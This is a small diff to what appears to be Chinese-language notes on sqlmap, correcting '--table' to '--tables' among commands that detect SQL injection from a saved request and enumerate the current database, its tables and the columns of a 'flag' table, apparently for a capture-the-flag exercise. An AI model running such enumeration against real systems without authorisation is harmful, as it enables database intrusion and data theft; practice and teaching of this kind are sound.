@@ -23,7 +23,7 @@ python sqlmap.py -r r.txt	//找漏洞
 
 python sqlmap.py -r r.txt -current-db	//找库
 
-python sqlmap.py -r r.txt --table -D sql_test	//找库下的文件
+python sqlmap.py -r r.txt --tables -D sql_test	//找库下的文件
 
 python sqlmap.py -r r.txt --columns -T flag -D sql_test	//找文件下的字段
 
